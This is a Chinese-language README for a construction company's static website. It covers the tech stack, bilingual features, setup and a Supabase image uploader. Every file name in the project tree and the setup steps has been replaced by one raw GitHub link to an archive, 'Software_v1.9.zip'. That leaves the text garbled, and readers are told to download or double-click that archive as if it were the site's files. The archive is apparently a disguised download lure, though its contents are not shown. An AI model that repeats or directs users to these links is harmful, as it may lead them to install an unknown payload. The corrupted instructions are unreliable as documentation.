# HON Construction 官方網站

這是一個為 HON Construction Sdn. Bhd.（馬來西亞 CIDB G5 持牌承包商）構建的靜態官方網站。網站主要用於展示公司的水網與排污工程服務、專案案例以及提供聯絡方式。

## 🛠 技術棧 (Tech Stack)

此專案設計為輕量級、無需構建流程的靜態網站：

*   **HTML5**: 語義化標籤結構。
*   **Tailwind CSS (CDN)**: 使用 CDN 方式引入 Tailwind v3.4，無需 `npm install` 即可快速開發與調整樣式。
*   **Vanilla JavaScript**: 處理簡單的交互邏輯（語言切換、平滑滾動、模態框等）。
*   **Google Fonts**: 使用 Inter 和 Space Grotesk 字體。

## ✨ 主要功能

*   **雙語支持**: 內建英文 (EN) 與中文 (CN) 切換功能。
*   **響應式設計**: 完美適配桌面、平板與手機端瀏覽。
*   **專案展示**: 包含模態框 (Modal) 用於展示詳細的工程案例列表。
*   **聯絡表單**: 集成 WhatsApp 鏈接，用戶提交表單後直接跳轉至 WhatsApp 進行對話。
*   **SEO 優化**: 包含 Open Graph 標籤與基礎 SEO meta 設置。

## 📂 專案結構

```
.
├── assets/             # 靜態資源（圖片、圖標等）
├── https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip          # 背景圖片管理器（供客戶上傳新背景）
├── https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip          # 網站主頁（包含所有前端代碼）
├── https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip     # Python 腳本，用於處理原始專案數據並生成 JSON/CSV
├── https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip           # 由腳本生成的專案數據（可用於前端動態加載）
├── https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip        # 開發者交接指南
└── https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip           # 專案說明文件
```

## 🚀 如何開始 (Setup)

由於專案是純靜態的，您不需要安裝 https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip 或任何依賴。

1.  **下載/克隆專案**到本地。
2.  直接雙擊 `https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip` 在瀏覽器中打開即可預覽。
3.  **開發建議**: 使用 VS Code 安裝 "Live Server" 插件，右鍵 `https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip` 選擇 "Open with Live Server" 以獲得熱重載體驗。

## 🐍 數據處理腳本 (Data Script)

`https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip` 是一個輔助腳本，用於整理工程專案數據。
*   它讀取腳本內硬編碼的原始數據 (`raw_projects`)。
*   執行數據依賴清理、去重與格式化。
*   **注意**: 腳本內包含硬編碼的文件路徑（如 `https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip`），若需在本地運行此腳本，請先修改為您的本地路徑。

## 📦 部署 (Deployment)

正如 `https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip` 中所述，您可以輕鬆地將此專案部署到任何靜態託管服務：

*   **Netlify / Vercel**: 直接將專案文件夾拖入即可。
*   **GitHub Pages**: 將代碼推送到 GitHub 倉庫並開啟 Pages 服務。

## 🖼 背景圖片管理 (Dynamic Background)

客戶現在可以隨時更換首頁背景圖：
1.  打開 `https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip`。
2.  選擇一張新的圖片並點擊「上傳」。
3.  圖片將自動保存在 Supabase Storage 中，首頁背景將實時更新。

> [!NOTE]
> `https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip` 使用了您提供的 Supabase Keys 進行認證。請確保此文件的訪問權限僅限於管理員。


*   **文字內容**: 大部分文字直接位於 `https://raw.githubusercontent.com/yongsinfok/honconstuctions/main/assets/Software_v1.9.zip` 中，部分動態文字（如多語言切換）位於底部的 `translations` 對象中。
*   **樣式**: 直接在 HTML 元素的 `class` 屬性中修改 Tailwind 類名。
